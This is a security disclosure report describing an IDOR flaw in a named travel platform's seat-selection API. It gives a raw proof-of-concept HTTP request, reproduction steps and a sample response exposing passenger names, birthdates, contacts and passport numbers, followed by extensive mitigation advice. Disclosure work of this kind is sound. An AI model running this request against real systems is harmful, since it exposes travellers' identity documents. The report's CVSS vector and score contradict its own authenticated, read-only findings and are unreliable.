

**Target:** `staging-prime.navan.com`

**Report date:** 2025-10-12

**Reported by:** Hassan Habib (provided PoC)

---

## 1. Executive summary

An Insecure Direct Object Reference (IDOR) exists in the seat-selection/passenger lookup flow. By changing the `passengerUuid` value in the JSON body of the seat selection endpoint request, an attacker can read full passenger profile information (including PII such as full name, birthdate, phone, email, passport number and expiry) for _any_ passenger whose UUID is known. UUIDs for passengers are trivial to discover (or can be obtained via invite/trip flows), making the vulnerability easily exploitable.

This allows unauthorized disclosure of sensitive PII and travel document data and therefore should be treated as **High** severity.

---

## 2. Affected endpoints (observed)

- `POST /api/v1/trip/flight/searches/{searchUuid}/contracts/{contractUuid}/flightsegments/{segmentIndex}/selectseat?fullSeatMap=true&seat={seat}`
    

(Other endpoints that accept `passengerUuid` as input may also be affected — review all API endpoints and handlers that accept passenger UUIDs client-side.)

---

## 3. Proof of concept (PoC)

> **Note:** sensitive values (Authorization, session cookies) are redacted. Do not store or transmit live tokens in attachments.

**Request (raw HTTP / Burp-style):**

```
POST /api/v1/trip/flight/searches/82f0fa18-fa6c-40b1-b9ec-53bef45dafc1/contracts/ad9dd2a5-0c74-4ffe-8b4b-75cf4ca3b119/flightsegments/0/selectseat?fullSeatMap=true&seat=1A HTTP/2
Host: staging-prime.navan.com
User-Agent: [REDACTED]
Accept: application/json, text/plain, application/pdf
Content-Type: application/json
Authorization: TripActions [REDACTED_JWT]
Cookie: [REDACTED]
Origin: https://staging-prime.navan.com

{"passengerUuid":"0172ca2b-3cf7-4c0e-8cc6-23b05e43c36c","airlineLoyaltyCards":{}}
```

**Exploit:** Change `passengerUuid` to any other UUID (e.g. obtained via invites, user lists, earlier API responses or guessable identifiers). The server returns the passenger record in the response body.

**Example response (redacted sensitive fields):**

```
HTTP/2 200 OK
Content-Type: application/json

{ "passenger": { "uuid": "0172ca2b-3cf7-4c0e-8cc6-23b05e43c36c", "givenName": "Habibi", "familyName": "me", "birthdate":"1994-10-10", "contact": { "phone": { "number": "+16468213544" }, "email": "bold-wood-9978@bugcrowdninja-124.com" }, "passport": { "number": "B7F4K2M9Q", "countryOfIssue":"GB", "expiresOn": "2030-10-10" }, ... }, "seats": ["1A"] }
```

(Full returned JSON contained multiple PII and passport fields.)

---

## 4. Impact

- **Data confidentiality breach:** Full passenger PII (name, DOB, phone, email) and passport data are exposed.
    
- **Privacy / regulatory risk:** Depending on customer jurisdiction, exposure of passport numbers and DOB may trigger data protection rules (e.g., GDPR, PDPA) and require breach reporting.
    
- **Account takeover / targeted attacks:** Knowledge of phone/email/passport increases risk of phishing, SIM swap, social engineering, or travel fraud.
    
- **Lateral movement:** If similar lack of access control exists on other endpoints, an attacker may enumerate passengers and retrieve sensitive travel records across bookings.
    

Severity: **High** (sensitive personal data + passport numbers disclosure). CVSS (approx.): **7.5 (HIGH)** — vector: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (example).

---

## 5. Root cause (likely)

- The server trusts a client-provided `passengerUuid` parameter to return passenger details without verifying that the caller is authorized to access that passenger record.
    
- Missing or insufficient ownership/authorization check: the backend does not verify passenger -> booking/contract or caller relationship.
    

---

## 6. Reproduction steps (concise)

1. Authenticate as a legitimate user (or use valid session/JWT in the `Authorization` header).
    
2. Send a `POST` request to the seat selection endpoint with `passengerUuid` set to another passenger's UUID (e.g., one discovered via an invite flow, previously-known booking UUIDs, or from client side metadata).
    
3. Observe HTTP 200 and returned passenger object containing PII.
    

---

## 7. Mitigation & recommended fixes

**Short-term / immediate mitigations**

- **Apply server-side authorization checks** for any request that includes `passengerUuid`. Ensure that the requesting user (or client) is authorized to view or modify the passenger resource: verify passenger belongs to the booking/contract and the caller's company or role has access.
    
- **Remove unnecessary PII** from seat-selection responses — only return minimal data required for seat assignment (for example, passenger display name or masked identifiers) rather than full passport numbers and DOB.
    
- **Audit logs & rotate credentials**: assume data exposure and rotate any long-lived tokens if needed; audit access logs for suspicious activity.
    

**Long-term / secure design changes**

1. Use association checks: when `passengerUuid` is provided, the backend must validate: `passengerUuid ∈ booking.passengers` and `booking.contract` belongs to caller's tenant/company or that caller has an admin role.
    
2. Enforce least privilege: only return fields required by the client flow. Mask or omit passport numbers and full DOB unless explicitly needed and properly authorized.
    
3. Introduce parameter binding: prefer using server-generated session-bound identifiers (non-guessable, short-lived references) rather than accepting raw UUIDs that map to global objects.
    
4. Add automated tests (unit/integration) to verify access control rules for passenger-related endpoints.
    
5. Add rate limiting and monitoring on passenger enumeration patterns.
    

**Developer checklist**

-  Validate passenger ownership against booking/contract and caller identity.
    
-  Remove/obfuscate passport and sensitive fields in non-authorized responses.
    
-  Add unit tests for negative cases (accessing passenger of another company should return 403).
    
-  Add audit logging for passenger data access.
    

---

## 8. Suggested response codes

- Unauthorized access should return **403 Forbidden** (or 404 Not Found to avoid leaking existence) when the passenger is not accessible to the caller.
    

---

## 9. Suggested timeline and disclosure

- **Immediate:** Fix authorization check and sanitize responses.
    
- **Within 24–72 hours:** Rotate any compromised tokens if there is evidence of mass enumeration.
    
- **Within 7 days:** Deploy tests and monitoring to prevent regression.
    

---

## 10. Appendix: additional notes

- UUID discovery: UUIDs can often be leaked by other API responses (invites, search results, trip creation responses), so it is critical to treat any client-provided identifier as untrusted.
    
- Audit other endpoints that accept `passengerUuid`, `userUuid`, `employeeId`, or similar parameters.
    

---

## 11. Contact

If you want, I can convert this report into a formatted PDF or Word document suitable for submission to the engineering team, or prepare a short remediation checklist for your ticketing system.

_End of report._